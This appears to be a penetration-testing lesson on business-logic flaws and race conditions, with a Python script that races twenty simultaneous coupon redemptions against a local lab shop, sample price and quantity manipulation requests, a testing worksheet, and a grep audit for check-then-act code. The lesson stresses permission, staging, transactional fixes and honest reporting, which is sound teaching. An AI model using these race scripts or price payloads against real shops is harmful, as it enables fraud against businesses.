Business Logic and Race Conditions

Summary

Everything in ps-02 through ps-08 is a parsing bug: two components disagree about what a
string means. Logic flaws are different. The application parses everything correctly and still
does the wrong thing.

The difficulty is that there is no oracle. A race condition has no
error message, no reflected output, and no signature. You find them by
thinking about what the business rule actually is and then attacking
it directly.

What makes a logic flaw

  The code is correct. The MODEL is wrong.

  A vulnerability is present when:
    the application enforces a rule INCORRECTLY, or
    does not enforce it at all in some path, or
    enforces it non-ATOMICALLY, or
    enforces it in the CLIENT only

The canonical inventory

  1. RACE CONDITIONS       two steps, one check, no transaction
  2. MASS ASSIGNMENT       (ps-04) binding unlisted fields
  3. PAYMENT MANIPULATION  negative amounts, currency rounding, coupon stacking
  4. PRICE / QUANTITY      client-supplied price, negative quantity, overflow
  5. COUPON / DISCOUNT     reuse, stacking, applying after the fact
  6. STATE MACHINE SKIPS   an order that goes shipped -> refunded without paid
  7. MISSING SERVER CHECKS hidden buttons, disabled flags
  8. BUSINESS RULE BYPASS  "one per customer" enforced by JS only
  9. FILE-BASED CHECKS     a flag in a file or a cookie the user controls
 10. ALGORITHMIC          the invite code, the referrer, the "is this valid"

Race conditions, the core technique

  THE PATTERN:
    step 1: CHECK a condition
    step 2: ACT on it
    between 1 and 2, the condition can change

  THE EXPLOIT:
    send MANY copies of the same request at the same instant
    every copy passes the check, then every copy acts

  WHAT YOU ARE ATTACKING: the gap between a check and its use.

The classic examples

  ONE COUPON PER USER
    check: has this user used this coupon?  -> no
    act:   mark it used, apply the discount
    race:  50 concurrent requests -> 50 discounts, one recorded

  ONE ITEM PER USER
    check: has this user bought this SKU? -> no
    act:   create the order
    race:  50 orders created

  BALANCE TRANSFER
    check: balance >= amount
    act:   debit A, credit B
    race:  two transfers in flight -> double spend

  THE FIX, and it is always the same three words: DATABASE TRANSACTION.
    With a row lock (SELECT ... FOR UPDATE) or a UNIQUE constraint that
    spans the condition and the action.

Why it is hard to test, honestly

  - the race window may be microseconds wide
  - it is load-dependent and flaky; it may take 200 attempts
  - a failed attempt may leave inconsistent state
  - it can be destructive to the business data

  THEREFORE:
    - test in a staging copy, not production
    - never do it without explicit written permission
    - use a delay-injectable test build if you control the app
    - if you cannot demonstrate it, report it as a DESIGN FINDING,
      not an exploit: "the check and the action are not atomic;
       a concurrent request can bypass it"

Price and quantity manipulation

  THE BUG: the total is computed on the client and sent to the server.

    POST /checkout
    { "items": [{"sku":"A","qty":2,"price":0.01}], "total": 0.02 }

  THE FIX: the server computes the total from the database price.
            NEVER accept a price from a client. Ever.

  RELATED:
    - negative quantity      -> qty=-1 makes a refund a charge
    - integer overflow       -> qty=2147483647 * price wraps
    - currency rounding      -> 0.005 rounds down consistently
    - coupon AFTER total     -> apply the discount to an already-computed total
    - negative refund        -> refund more than was paid

State machines

  A correct order lifecycle:

    cart -> checkout -> paid -> shipped -> delivered
                  \-> cancelled
                  \-> refunded  (only from paid/delivered)

  THE BUG: the handler for "refund" does not check the current state.
           So: create an order, then immediately POST to /refund.
           You get money for goods you never paid for.

  THE TEST: for every state transition, enumerate all PAIRS of states
            and try the transition directly. cart->delivered. 
            unpaid->refunded. The matrix is finite and small.

The methodology that works

  1. LEARN THE BUSINESS RULES FIRST
     what is supposed to be true? Write them down before testing.
     "A user may redeem one coupon per order."
     "An order cannot be refunded before payment."
     You cannot violate a rule you have not written down.

  2. MAP THE STATE MACHINE
     every status, every transition, every actor

  3. LOOK FOR THE GAP
     - is the check server-side?
     - is it atomic with the action?
     - does it cover every field that matters?
     - can the order of two requests change the outcome?

  4. TEST THE MATRIX, NOT THE EXAMPLE
     one negative case proves nothing; the matrix is the coverage

  5. DOCUMENT THE BUSINESS IMPACT
     "the coupon race cost an estimated $X per concurrent request,
      repeatable, unauthenticated" - that is the finding. The technique
      is almost beside the point.

Reporting logic findings

  These are the findings most likely to be dismissed and most likely to
  be the biggest problem in the application. Make them undeniable:

  - state the business rule explicitly
  - state the exact request sequence
  - quantify: how many times, what value, over what period
  - show the control that SHOULD exist and does not
  - give the fix as a control, not a code patch

  If you cannot exploit it but you can SEE the non-atomicity, report it
  as a design flaw with a proof-of-concept explanation rather than
  claiming a breach you did not achieve. Honesty here is worth more than
  an overstated severity, because the first report is the one they read.

Terminology

Term Meaning
Business logic flaw Correct code enforcing an incorrect model
Race condition Interleaving between a check and its use
TOCTOU Time-of-check to time-of-use
Atomicity The check and the action happen as one unit
Database transaction The standard atomicity tool
SELECT ... FOR UPDATE Row lock for atomic check-and-act
Unique constraint Enforces "one per user" in the database
State machine The valid states and transitions of an object
Price manipulation Client-supplied price trusted by the server
Coupon stacking Applying several discounts that should be exclusive
Skip a state Moving an object between states illegally
TOCTOU on a file Check-then-replace on a flag file

# --- 3. FLAW 1: the race, for real ---
cat > race.py <<'PY'
#!/usr/bin/env python3
"""TOCTOU coupon race against our own shop.

20 threads, one coupon, all at the same instant. If the app has no
lock or unique constraint, several threads will pass the check before
any of them writes.
"""
import threading, urllib.request, urllib.parse, time, collections, sys

BASE = "http://127.0.0.1:8080/shop.php"
N = 20
results = collections.Counter()
barrier = threading.Barrier(N)

def attempt(i):
    data = urllib.parse.urlencode({"action": "coupon", "code": "SAVE10"}).encode()
    req = urllib.request.Request(BASE + "?u=racer" + str(i), data=data)
    barrier.wait()                                   # release all at once
    try:
        body = urllib.request.urlopen(req, timeout=10).read().decode()
        if "applied to" in body:   results["APPLIED"] += 1
        elif "already used" in body: results["already used"] += 1
        else:                        results["other: " + body[-60:]] += 1
    except Exception as e:
        results[f"error {type(e).__name__}"] += 1

print(f"  launching {N} simultaneous coupon redemptions")
t0 = time.time()
ts = [threading.Thread(target=attempt, args=(i,)) for i in range(N)]
for t in ts: t.start()
for t in ts: t.join()
dt = time.time() - t0

print(f"  results after {dt:.2f}s:")
for k, v in results.most_common():
    print(f"    {v:>3} x {k}")
print()
applied = results["APPLIED"]
if applied > 1:
    print(f"  *** RACE CONFIRMED: {applied} threads passed the check ***")
    print("  The check is not atomic with the action. In production that is")
    print("  one coupon honoured N times.")
    print("  Fix: UPDATE coupons SET used_by=? WHERE code=? AND used_by IS NULL,")
    print("       then check rowCount()===1, inside one transaction.")
else:
    print(f"  only {applied} succeeded - the race window is narrow here.")
    print("  That does NOT mean the code is safe; it means the timing was")
    print("  lucky. The fix is still a transaction and a conditional UPDATE.")
PY
python3 race.py 2>&1 | tee 02-race.txt

# --- 5. the methodology, as a worksheet ---
cat > 04-method.md <<'EOF'
# Finding logic flaws: the worksheet

## 1. Write the business rules down FIRST
You cannot violate a rule you have not written down. Interview the
product owner or read the documentation. Produce a list like:

    R1  A user may redeem at most one SAVE10 coupon per order.
    R2  An order must be paid before it can be shipped.
    R3  An order may be refunded only from paid, shipped or delivered.
    R4  Prices are set by the catalogue. Users do not choose them.
    R5  Inventory is decremented when the order is paid, not when created.

## 2. Map the state machine
    for each object that has a lifecycle:
        list the states
        list the transitions
        list who may perform each transition
    Draw it. The drawing usually reveals the missing edge.

## 3. For each rule, ask the four questions
    a) is the check SERVER-SIDE?           (a JS check is not a check)
    b) is the check ATOMIC with the action? (a transaction, a row lock)
    c) does the check COVER EVERY FIELD?   (price, quantity, status, actor)
    d) does the check run on EVERY PATH?   (the CLI, the API, the import)

## 4. Test the matrix, not the example
    coupon  x  single-use, per-user, per-order, stacking, expiry, amount
    price   x  negative, zero, overflow, currency, coupon-after-total
    order   x  every state pair, every actor
    inventory x decrement timing, negative stock, oversell

## 5. Record the IMPACT in business terms
    "20 concurrent requests redeemed one coupon 20 times" is a finding.
    "TOCTOU on the coupon check" is a code observation.
    The first gets fixed. The second gets deferred.

## 6. Be honest about what you did not prove
    If the race window is too narrow to demonstrate reliably, say:
      "The check and the action are not atomic. Under concurrency
       this check can pass more than once. I was unable to reproduce
       it in testing, and I recommend it be treated as a design flaw."
    That is a professional report. An overstated claim is not.
EOF
cat 04-method.md

# --- 6. the audit: find logic smells in code ---
cat > 05-audit.sh <<'EOF'
#!/usr/bin/env bash
echo "=== 1. check-then-act: the TOCTOU shape ==="
grep -rn -A4 -iE "SELECT.*WHERE.*(used|redeemed|claimed|available|balance)" \
     --include="*.php" . | grep -B2 -A3 "UPDATE" | sed 's/^/  /'
echo "  ^ a SELECT followed by an UPDATE with nothing atomic between them"

echo; echo "=== 2. transactions: is there even one? ==="
grep -rn "beginTransaction\|START TRANSACTION\|COMMIT\|ATOMIC" --include="*.php" . | sed 's/^/  /'
echo "  ^ empty means no atomicity anywhere in the app"

echo; echo "=== 3. client-supplied money ==="
grep -rnE "\\\$_POST\[.(price|amount|total|cost|balance|discount)" --include="*.php" . | sed 's/^/  /'
echo "  ^ the server is storing a number the client chose"

echo; echo "=== 4. negative and overflow handling ==="
grep -rnE "\\\$_POST\[.(qty|quantity|amount)" --include="*.php" . | sed 's/^/  /'
echo "  ^ is there a < 0 check? is the arithmetic 64-bit?"

echo; echo "=== 5. state changes without a state check ==="
grep -rn -B1 -A2 "SET status" --include="*.php" . | sed 's/^/  /'
echo "  ^ does the WHERE clause constrain the CURRENT state, or just the id?"

echo; echo "=== 6. the correct pattern, to compare against ==="
cat <<'FIX'
  -- WRONG: check then act
  SELECT used_by FROM coupons WHERE code = ?
  if (used_by === null) UPDATE coupons SET used_by = ?

  -- RIGHT: one conditional statement, then look at what it changed
  UPDATE coupons SET used_by = ? WHERE code = ? AND used_by IS NULL
  -- if rowCount() !== 1, someone else got there first. Done.

  -- RIGHT, and the constraint enforces it at the database level:
  CREATE UNIQUE INDEX one_coupon_per_order ON applied (order_id, code);
FIX
EOF

Step 3 is the deliverable: twenty threads released through a threading.Barrier at the same
instant against one coupon. When several threads come back APPLIED, that is TOCTOU observed
rather than asserted — and race.py is careful to say that a failed race does not mean the
code is safe, it means the timing was lucky. That distinction is what a real report turns on.

Step 4 does the state matrix, which finds unpaid → refunded in one request pair.
